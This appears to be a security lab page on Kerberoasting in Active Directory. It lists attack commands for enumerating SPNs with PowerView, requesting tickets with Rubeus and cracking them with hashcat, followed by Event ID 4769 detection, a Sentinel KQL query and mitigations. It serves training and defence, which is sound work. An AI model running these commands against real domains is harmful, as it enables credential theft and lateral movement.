# Attack Scenario: Kerberoasting

This scenario demonstrates how attackers extract and crack Kerberos service tickets (TGS) for service accounts with weak passwords, allowing lateral movement or privilege escalation in an on-prem Active Directory environment.

**MITRE Techniques:**
- Credential Access (T1558.003)

## Lab Environment
- Active Directory Domain Controller (`DC01`)
- Windows 11 workstation joined to domain
- Service account: `svc-webapp`
  - SPN: `HTTP/webapp01.internal.lab`
  - Member of Domain Users
  - Password: weak / old

## Objectives
- Enumerate user accounts with SPNs
- Request TGS tickets
- Extract and crack TGS hashes offline
- Reuse credentials for SMB or RDP access

## Execution
### 1. Enumerate SPNs with PowerView

```Get-DomainUser -SPN | Select SamAccountName, ServicePrincipalName```

### 2. Request service tickets

```Rubeus.exe kerberoast```

### 3. Extract and crack hashes offline

```hashcat -m 13100 kerberoast.hashes rockyou.txt```

## Detection Guidance

### 🔹 Defender for Identity
- Alert: "Kerberoasting attempt detected"

### 🔹 Event Logs
- Event ID 4769 (TGS Request)
- Unusual volume of TGS requests for different SPNs

### 🔹 KQL Example – Sentinel

```
SecurityEvent
| where EventID == 4769
| where ServiceName endswith '$' == false
| summarize Count = count() by Account, ClientAddress, bin(TimeGenerated, 15m)
| where Count > 5
```


## Mitigations

- Use long, complex service account passwords
- Rotate passwords regularly
- Replace static accounts with gMSAs
- Monitor for abnormal TGS requests

## Resources

- https://attack.mitre.org/techniques/T1558/003/
- https://github.com/GhostPack/Rubeus
- https://adsecurity.org/?p=2293


[← Back to Lab Index](../../README.md)
[→ Related: ]()